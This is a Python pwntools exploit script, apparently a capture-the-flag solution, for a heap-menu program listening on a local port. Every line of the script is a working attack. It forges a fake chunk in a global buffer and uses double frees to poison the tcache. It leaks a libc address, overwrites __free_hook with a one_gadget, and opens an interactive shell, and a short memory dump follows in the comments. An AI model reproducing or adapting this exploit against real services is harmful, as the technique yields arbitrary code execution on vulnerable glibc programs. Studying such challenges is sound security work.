from pwn import *

p = remote('localhost', 7777)
libc = ELF('./libc.so.6')

name = 0x602100
one_gadget = 0x4f322

def add(size, data):
    p.sendlineafter('Choice: ', '1')
    p.sendlineafter('size: ', str(size))
    p.sendlineafter('data: ', data)

def delete(i):
    p.sendlineafter('Choice: ', '3')
    p.sendlineafter('index: ', str(i))

def show():
    p.sendlineafter('Choice: ', '4')
    p.sendlineafter('(Y/N)', 'N')
    p.recvuntil('Name: ')
    return p.recvline()[:-1].ljust(8, b'\x00')


payload = p64(0) + p64(0x91)
payload += p64(name + 0x10) * 2
payload += p64(name) * 2
payload += p64(name + 0x90) * 10
payload += p64(0) + p64(0x21)
payload += p64(0) * 2
payload += p64(0) + p64(0x21)

p.sendlineafter('name: ', payload)

add(0x18, '')

delete(22)  # name + 0x10
delete(23)  # name + 0x10
add(0x88, p64(name - 0x10)) 
add(0x88, '')
add(0x88, p64(0) + p64(0x91))
delete(24)  # name

libc.address = u64(show()) - 0x60 - 0x3ebc40
print(hex(libc.address))

delete(26)  # name + 0x90
delete(27)  # name + 0x90
add(0x18, p64(libc.symbols['__free_hook']))
add(0x18, '')
add(0x18, p64(libc.address + one_gadget))
delete(28)  # name + 0x90

p.interactive()

# 0x602060:       0x00000000006032a0      0x0000000000000000
# 0x602070:       0x0000000000000000      0x0000000000000000
# 0x602080:       0x0000000000000000      0x0000000000000000
# 0x602090:       0x0000000000000000      0x0000000000000000
# 0x6020a0:       0x0000000000000000      0x0000000000000000
# 0x6020b0:       0x0000000000000000      0x0000000000000000
# 0x6020c0:       0x0000000000000000      0x0000000000000000
# 0x6020d0:       0x0000000000000000      0x0000000000000000
# 0x6020e0:       0x0000000000000000      0x0000000000000000
# 0x6020f0:       0x0000000000000000      0x0000000000000000
# 0x602100:       0x0000000a41414141      0x0000000000000000
